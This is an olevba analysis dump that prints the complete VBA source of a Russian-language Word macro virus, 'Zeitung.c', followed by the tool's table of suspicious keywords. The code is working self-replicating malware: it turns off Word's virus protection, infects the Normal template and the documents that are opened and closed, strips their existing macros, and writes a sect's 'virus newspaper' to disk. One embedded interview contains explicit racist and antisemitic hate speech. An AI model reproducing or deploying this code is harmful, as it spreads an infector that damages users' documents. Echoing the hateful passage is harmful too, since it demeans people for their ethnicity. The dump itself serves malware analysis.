olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.c-bfa84d4823bf206ab8986b436f404cf43d7dc4e3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.c-bfa84d4823bf206ab8986b436f404cf43d7dc4e3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Signature = "VirusZeitung" 'сигнатура вируса
'иу одл:АкдйФнрвкй лкад фео  иалШтлв@Врссзаи раи иаеси,АеснрЕрмвиМхи аао
'2
'номер 2 за 2000 год
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
 End If
 End If
End Function
Private Sub Document_Open()
 On Error Resume Next
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If Mid(ActiveDocument.Name, 1, 12) = "Адский огонь" Then
  Exit Sub
 End If
 reg = False
 p = 0.05
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then p = 2 ' 2  февраля
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then p = 2 ' 21 марта
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then p = 2 ' 30 апреля
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then p = 2 ' 21 июня
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then p = 2 ' 2  августа
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then p = 2 ' 21 сентября
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then p = 2 ' 31 октября
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then p = 2 ' 21 декабря
 If Rnd >= p Then
  Exit Sub
 End If
 Documents.Add Template:="Normal", NewTemplate:=False
 With ActiveDocument.PageSetup
      .LineNumbering.Active = False
      .Orientation = wdOrientPortrait
      .TopMargin = CentimetersToPoints(1.5)
      .BottomMargin = CentimetersToPoints(1.5)
      .LeftMargin = CentimetersToPoints(2.5)
      .RightMargin = CentimetersToPoints(2)
      .Gutter = CentimetersToPoints(0)
      .HeaderDistance = CentimetersToPoints(1.25)
      .FooterDistance = CentimetersToPoints(1.25)
      .PageWidth = CentimetersToPoints(21)
      .PageHeight = CentimetersToPoints(29.7)
      .FirstPageTray = wdPrinterDefaultBin
      .OtherPagesTray = wdPrinterDefaultBin
      .SectionStart = wdSectionNewPage
      .OddAndEvenPagesHeaderFooter = False
      .DifferentFirstPageHeaderFooter = False
      .VerticalAlignment = wdAlignVerticalTop
      .SuppressEndnotes = False
      .MirrorMargins = False
 End With
 Druck_0 "А Д С К И Й   О Г О Н Ь", 40, True, wdAlignParagraphCenter, 0, False
 Druck_0 "Вирусная газета секты им. Дж. Ди и Э. Келли.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "Выход по мере комплектования номера", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "10 мая  2000  г.   № 2 (2)", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "Сегодня в номере:", 18, True, wdAlignParagraphLeft, 0, True
 Druck_0 "* Мнения читателей о газете. (Подборка интервью)", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Предложения по улучшению работы газеты:", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Мы совершенствуем свой вирус.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Насильно мил не будешь.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Свой вирус - своими руками. ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Мы - вам, вы - нам (о проблемах обратной связи). ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Наши планы.", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 vb = 1
 ve = 1
 reg = True
 vb = Artikel_B(nt, vb, 1)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 vb = Artikel_B(nt, ve, 2)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 0, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, False
 For art = 3 To 6
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
  For v = vb + 1 To ve
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
 Next art
 vb = Artikel_B(nt, ve, 7)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 For v = vb + 2 To ve
  Druck_0 nt.codemodule.lines(v, 1), 14, True, wdAlignParagraphRight, 1.5, True
 Next v
 Selection.TypeParagraph
 Selection.TypeParagraph
 For art = 8 To 11
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
  Selection.TypeParagraph
  For v = vb + 1 To ve - 1
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
  Selection.TypeParagraph
 Next art
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 12)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 0, False
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 4, 1), 14, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 5, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
 Selection.TypeParagraph
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 13)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, True, wdAlignParagraphRight, 0, True
 reg = False
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Учредитель - сатанинская секта имени Джона Ди и Эдварда Келли", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Главный редактор - В. Д. Тараскин", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Директор - Г. С. Лисунов", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Автор идеи - А. Н. Генова", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Консультант по вопросам вирусологии -  П. В. Ногин", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Главный программист - А. В. Рыжов", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Компьютерный набор и оформление - Т. В. Зубова", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Корректор - В. Ф. Федоров", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Мнение редакции может не совпадать с позицией авторов публикаций.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "При перепечатке и использовании материалов ссылка на газету необязательна.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Редакция не несет ответственности за содержание публикуемых материалов.", 14, False, wdAlignParagraphCenter, 0, True
 ActiveDocument.SaveAs FileName:="Адский огонь № 2", FileFormat:=wdFormatRTF, LockComments:=False, Password:="", AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:=False
 ActiveDocument.Close
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = False
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then   'заражение активного документа
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Макросы, бывшие в документе до внедрения вируса"
   For v = 1 To cofl
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, cofl
  End If
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Документ") Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then   'заражение шаблона Normal
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Макросы, бывшие в шаблоне Normal.dot"
   For v = 1 To cofl
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, cofl
  End If
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind, Abz)
 Selection.Font.Size = Siz 'размер шрифта
 Selection.Font.Bold = Bld 'жирность
 Selection.ParagraphFormat.Alignment = Alg 'выравнивание
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind) 'отступ
 If Abz Then Selection.TypeParagraph
 If reg Then
  Selection.TypeText Text:=Mid(T, 2, Len(T) - 1)
 Else
  Selection.TypeText Text:=T
 End If
End Sub
Private Function Artikel_B(O, start, num)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_B = -1
  Exit Function
 End If
 While (O.codemodule.lines(start, 1) <> "'Articl #" + Trim(num)) And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 Artikel_B = start + 1
End Function
Private Function Artikel_E(O, start)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_E = -1
  Exit Function
 End If
 While (Mid(O.codemodule.lines(start, 1), 1, 9) <> "'Articl #") And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 If start > O.codemodule.countoflines Then
  start = start - 1
 End If
 Artikel_E = start - 1
End Function
'Articl #1
'ПЕРВЫЙ НОМЕР ВЫШЕЛ В СВЕТ. МНЕНИЯ  ЧИТАТЕЛЕЙ.
'Выход в свет первого номера нашей газеты стал неожиданностью для многих людей, имеющих дело с компьютерами. Мы помещаем здесь небольшую подборку интервью, взятых у нескольких человек, впервые познакомившихся с "Адским огнем". Надеемся, они достаточно полно представляют спектр мнений о новой газете. Следует отметить, что не все люди соглашались на интервью: многие испытывают сильное отвращение к сатанистам и сатанинским сектам.
'Articl #2
'Липатова Н. Н., патентовед из "Астраханьгазпрома".
'Я думаю, что Ваша газета есть полезнейшее и нужное изобретение. Не секрет, что сейчас свобода печати существует только на бумаге, коррупция стала тотальной, а пресса сплошь и рядом лижет задницу власти, и не выполняет своего назначения. Газета, которая по-настоящему свободна от какого-либо контроля сверху, совершенно необходима. У нее есть только один недостаток: совершенно непонятно, как осуществляется обратная связь между читателями и газетой. Если я, к примеру, захочу написать письмо в нее, по какому адресу его отправить? Думаю, над этим вопросом надо поработать. Кроме всего прочего, мне очень понравился ваш материал по национальному вопросу. Господин Сапугин поднял весьма актуальную тему, особенно для нашего предприятия. Там, где я работаю, давно требуется вмешательство партии "РНЕ". У нас русских почти не осталось, на каждом сколько-нибудь ответственном посту какой-нибудь инородец; впрочем, не буду голословной: в нашей лаборатории работают 8 человек, из них русских только трое, считая меня.
'Остальные: еврейка, украинка, спутавшаяся с арабом, татарка, одна, вообще неопределенной расовой принадлежности и кавказец, выдающий себя за русского. Из русских многие путаются со всякими инородцами и плодят от них неполноценных детей-полукровок, а ученым секретарем в нашем институте работает старый колченогий еврей, по которому давно плачет газовая камера. Пусть господин Сапугин знает, что в моем лице он всегда найдет ярого сторонника своего дела. Если это возможно, я хотела бы знать, как можно вступить в партию "Русское национальное единство".
'Articl #3
'Резник Д. М., преподаватель АГТУ.
'Я хотел бы сказать, что не одобряю Вашу газету, так как она по своей сути преступная, и материалы, публикуемые в ней, то же носят преступный характер. Считаю нужным напомнить Вам, что никто не отменял статей Уголовного кодекса, предусматривающих уголовную ответственность за создание и распространение компьютерных вирусов. Относительно опубликованных материалов могу сказать, что ваши люди сильно рискуют, сообщая свои фамилии. Что касается вашего Сапугина, то он просто гнида и козел, равно как и Баркашов. Совершенно случайно я узнал, кто такой Сапугин, и какие козлы из нашей администрации ему помогают. Думаю, что его политическая деятельность несовместима с учебой в АГТУ.
'Articl #4
'Воеводин И. Г. преподаватель АГТУ.
'Мне кажется, что ваш вирус нуждается в значительном усовершенствовании, так как при первом заражении он намертво вешает Word и страдает множеством других недоработок. Я думаю, что заражать документы в момент их открытия и создания совершенно необязательно: во-первых, это приводит к зависанию, а во-вторых любой созданный или открытый документ обязательно будет закрыт; заражение при закрытии прекрасно зарекомендовало себя у всех создателей макровирусов. Кроме того, внедрение текста газеты в редактируемый документ по-моему не совсем безвредно и настраивает ваших потенциальных читателей против вас. Было бы намного удобнее создавать специальный файл и записывать текст газеты в него. Рано или поздно читатель обнаружит новые файлы на диске и захочет  с ними ознакомиться. Тогда это никому не причинит вреда.
'Articl #5
'Шугаев В. Т. инженер.
'Я думаю, что такая газета совершенно необходима в нашем городе, где от обычной прессы нет никакого толка, только она должна находиться в руках не сатанистов, а какой-либо нейтральной группы людей. Понимаете, ребята, ваша религиозная принадлежность отталкивает людей от вас. У нас слова "сатанизм" и "сатанисты" вызывают инстинктивное отвращение, а в результате ваши потенциальные читатели проходят мимо важного начинания.
'Сам я давно увлекаюсь программированием, и мне кажется, что вы сделали настоящее открытие в области компьютерной вирусологии: "вирусной газеты" (или "газетного вируса", кому как больше нравится) еще никто, по моим сведениям, не делал. Это очень хорошо, что ваша газета открыта для всех, однако непонятно, каким образом можно написать письмо в редакцию нее, ведь насколько я понял, вы не привели свои координаты? Меня также интересует, можете ли Вы помещать разные объявления и рекламу?
'Articl #6
'Симонов И. В. врач-психиатр.
'Сразу скажу, что в вашем деле я разбираюсь слабо, но мне кажется, что главарю вашей секты и директору газеты требуется серьезное лечение. По-моему они страдают манией величия, которая уже довела их до противоправных действий, и в дальнейшем может привести в тюрьму. То же самое могу сказать обо всем авторском коллективе. Очень настораживает то обстоятельство, что эти люди открыто приводят свои фамилии, когда следовало бы ожидать от них максимальной скрытности. Как врач я настоятельно рекомендую им пройти обследование на предмет состояния их психики, пока еще не поздно.
'Articl #7
'Харитонов А. А., студент.
'Безусловно, никем не контролируемая газета необходима, а то, как вы ее распространяете не имеет никакого значения. Только вирус нужно немного доработать, чтобы он не искажал редактируемый текст. Хотелось бы знать, как у вас осуществляется связь с общественностью и можете ли вы оказать конкретную помощь в каком-либо деле? Нельзя ли у вас помещать объявления о знакомствах? Если да, то я обеими руками голосую за продолжение вашего дела и дальнейшую работу газеты.
'Корреспонденты:  А. П. Петухов,
'К. Е. Васильков,
'М. В. Чурилов,
'С. М. Петренко,
'А.Г.Рыбкин
'Articl #8
'ГАЗЕТА СОЗДАНА. КУДА ТЕПЕРЬ ?
'На мартовском шабаше 2000 года было созвано отдельное заседание с участием руководителей секты и руководящего состава газеты; его темой стали перспективы дальнейшего развития газеты "Адский огонь".
'В начале заседания главарь секты выступил с сообщением о необходимости исправления недостатков в работе газеты, которые сдерживали ее дальнейшее распространение. В ходе последовавшей за этим дискуссии были высказаны многочисленные предложения, подвергавшиеся обсуждению всеми участниками заседания. Отдельные предложения были приняты к исполнению. За ограниченностью места мы приводим некоторые из них.
'Летописец секты  А. В. Абдикеев
'Articl #9
'МЫ СОВЕРШЕНСТВУЕМ СВОЙ ВИРУС
'На настоящий момент нами проделана огромная работа по распространению газеты "Адский огонь" и накоплен немалый опыт использования компьютерных вирусов в конструктивных целях. Вместе с тем, отмечены отдельные недостатки, которые будут преодолены  ходе дальнейшей работы.
'В частности, по отзывам наших сектантов, взявшихся распространять вирус, при заражении им главного шаблона NORMAL.DOT в первый раз Word "зависает"; кроме того, вирус вставляет текст газеты в редактируемый документ, что не всегда идет на пользу его разборчивости на экране, а также раздражает пользователя. По словам нашего консультанта-вирусолога П. В. Ногина вирус перегружен лишними деталями, которые только тормозят его работу.
'С учетом вышесказанного были проведены переговоры с авторами вируса, которые написали его новую версию, не имеющую данных недостатков. Нами были проведены всесторонние испытания нового вируса на компьютерах секты, которые показали его способность корректно заражать любые документы Word.
'Теперь текст газеты заносится в отдельный файл формата .RTF, который получает имя "Адский огонь № ..." и записывается на диск. Иногда это проходит незаметно для пользователя.
'Главный программист секты   А. В. Рыжов
'Articl #10
'НАСИЛЬНО  МИЛ  НЕ  БУДЕШЬ.
'Несмотря на то, что я являюсь автором идеи нашей газеты, я хотела бы напомнить Вам всем о необходимости соблюдения элементарных этических норм, которые мы нарушили, распространяя газету, так сказать, насильно. По-моему, это не должно повышать ее рейтинг, а как раз наоборот. Мне кажется, что каждый должен иметь возможность выбирать, что ему читать. Нельзя ли сделать такую программу, которая позволяла бы читателю фильтровать информацию, доставляемую вирусом по теме. На выход должно идти только то, что он желает читать. Меня также интересует: нельзя ли предоставить потенциальным читателям возможность выбирать, становиться ли им невольными распространителями газеты или нет? Нельзя ли им при необходимости ставить на своих машинах какой-нибудь условный знак для вируса, который будет блокировать его размножение? Предлагаю подумать над этим.
'И еще: как учитель литературы я на собственном опыте знаю, что в последнее время уровень грамотности людей заметно снизился; это явление затронуло и нашу секту. Читая материалы некоторых наших авторов, предназначенные для печати, я нашла в них множество разнообразных ошибок и опечаток. Для их исправления во всех газетах имеются корректоры, а в нашей - нет. Я советую господину директору подумать о введении должности корректора.
'Главный литературовед-аналитик секты А. Н. Генова
'Articl #11
'СВОЙ  ВИРУС - СВОИМИ  РУКАМИ.
'Прежде всего, хотелось бы напомнить всем, кто здесь присутствует, что вирус, которым мы распространяем нашу газету, является весьма ответственным изделием: он должен удовлетворять куче разных требований, по нему люди судят о нас, о нашей культуре и компьютерной грамотности. Мне кажется весьма странным, что вирус создают люди, имеющие весьма туманное представление о нашей работе, а распространяемую информацию в него вносим мы; это стало одной из причин некорректной работы вируса при выходе первого номера газеты, и неизвестно, сколько ошибок это может наделать в дальнейшем. Поэтому, я считаю необходимым создавать этот вирус своими руками. Из старого вируса необходимо взять самое лучшее и вырезать самое худшее, разумеется, с соблюдением всех прав его авторов. То, что предложила ранее Анна Николаевна безусловно заслуживает внимания, и над этим тоже следует поработать.
'Для выполнения подобной работы необходим программист с опытом создания и распространения макровирусов. Поручать такую работу главному программисту секты нецелесообразно по причине его большой загруженности, и поэтому я считаю необходимым укомплектовать штат газеты таким специалистом. В его обязанности должно входить создание и усовершенствование всего программного обеспечения газеты, включая и вирус.
'Директор газеты Г. С.  Лисунов
'Articl #12
'МЫ - ВАМ, ВЫ - НАМ.
'Как уже упоминалось в первом номере "Адского огня", для нашей газеты остро стоит проблема обратной связи с читателями. В настоящий момент мы используем сеть корреспондентов, распределенных по городу, однако этот способ малоэффективен, когда читатель имеет намерение передать какое-либо сообщение в газету и вынужден искать встречи с корреспондентом. В то же время, делать корреспондентов легко доступными мы не можем, так как это сделает их уязвимыми со стороны правоохранительных органов и конкурирующих сект. Для решения данной проблемы было внесено несколько предложений, однако все они будут реализованы позже, и до того момента мы предлагаем своим читателям просто писать в редакцию по адресу, который приводим ниже в зашифрованном виде. Этот шифр был когда-то разработан в нашей секте и прекрасно зарекомендовал себя. К настоящему времени он заменен более совершенным, и поэтому его использование в таких целях не причинит никакого ущерба. По мнению наших экспертов такой шифр могут расшифровать только те люди,
'которые действительно желают связаться с редакцией. Письма мы принимаем без ограничений; что касается людей, которые будут являться лично, то они будут подвергаться проверке на принадлежность к правоохранительным органам, для чего у нас есть специальная методика. Тем, кого мы сочтем сотрудниками вышеупомянутых учреждений, будут говорить, что ничего подобного здесь нет. Первые 10 читателей, правильно расшифровавшие адрес, получат приз в виде права на внеочередную публикацию своих материалов в нашей газете.
'Особо подчеркиваю: нет никакой необходимости называться настоящим именем, в нашей газете Вы можете публиковаться под псевдонимом или анонимно. Итак: адрес редакции:
' Маы1  ше6гур олаизв цм еЦзе НдЧТщаИаал.ен амиПирбс ияянабе ымвнв мп. оиё мс Сн в8спу ердюамо ш р 1еив7дова пактщчрьиаосо исп.ра
'Желаю Вам успеха!
'Главный редактор В. Д. Тараскин
'Articl #13
'НАШИ   ПЛАНЫ
'Как показал анализ интервью, взятых у некоторых наших читателей, они в большинстве своем интересуются возможностью помещать в нашей газете свои объявления, а некоторые еще и рекламу. Для этого мы планируем ввести в свой состав службу объявлений и отдел рекламы. Те, кто сможет расшифровать наш адрес, получит возможность присылать объявления. Для тех, кто не сможет этого сделать, мы разрабатываем систему обратной связи, основанную на передаче информации при помощи макровируса, подобно тому, как мы переправляем Вам газету. Эта система будет "доведена до ума" как только у нас появится штатный программист.
'Ни для кого не секрет, что приближается 10-летний юбилей секты. К этой дате мы планируем ряд публикаций, посвященных истории секты, ее созданию и нынешней деятельности. Я приглашаю всех членов секты помещать свои публикации на любую тему, связанную с историей секты.
'Директор газеты Г. С.  Лисунов

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

